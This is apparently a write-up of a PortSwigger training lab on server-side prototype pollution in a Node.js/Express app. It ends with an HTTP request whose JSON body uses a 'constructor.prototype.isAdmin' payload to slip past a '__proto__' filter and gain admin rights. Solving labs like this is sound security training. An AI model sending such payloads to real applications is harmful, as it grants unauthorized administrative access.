
# Bypassing flawed input filters for server-side prototype pollution

This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.

To solve the lab:

- Find a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype.

- Identify a gadget property that you can use to escalate your privileges.

- Access the admin panel and delete the user carlos.

- You can log in to your own account with the following credentials: wiener:peter

Note: When testing for server-side prototype pollution, it's possible to break application functionality or even bring down the server completely. If this happens to your lab, you can manually restart the server using the button provided in the lab banner. Remember that you're unlikely to have this option when testing real websites, so you should always use caution.

---------------------------------------------

References: 

- https://portswigger.net/web-security/prototype-pollution/server-side



![img](images/Bypassing%20flawed%20input%20filters%20for%20server-side%20prototype%20pollution/1.png)

---------------------------------------------

After interacting with the application I launched the extension:



![img](images/Bypassing%20flawed%20input%20filters%20for%20server-side%20prototype%20pollution/2.png)


It finds the vulnerability:



![img](images/Bypassing%20flawed%20input%20filters%20for%20server-side%20prototype%20pollution/3.png)


It looks like the extension added many fields:



![img](images/Bypassing%20flawed%20input%20filters%20for%20server-side%20prototype%20pollution/4.png)


In the update address page there is a Javascript script imported:



![img](images/Bypassing%20flawed%20input%20filters%20for%20server-side%20prototype%20pollution/5.png)


File “/resources/js/updateAddress.js”:



![img](images/Bypassing%20flawed%20input%20filters%20for%20server-side%20prototype%20pollution/6.png)



We can change most values but not “isAdmin”. From the notes, "an attacker can access the prototype via the constructor property instead of \_\_proto\_\_"

```
POST /my-account/change-address HTTP/2
...

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UKKKKKK","sessionId":"PDKi3aQnLAV0M8OWcB6qLExhgub4zcGW","constructor":{"prototype":{"isAdmin":true}}}
```



![img](images/Bypassing%20flawed%20input%20filters%20for%20server-side%20prototype%20pollution/7.png)
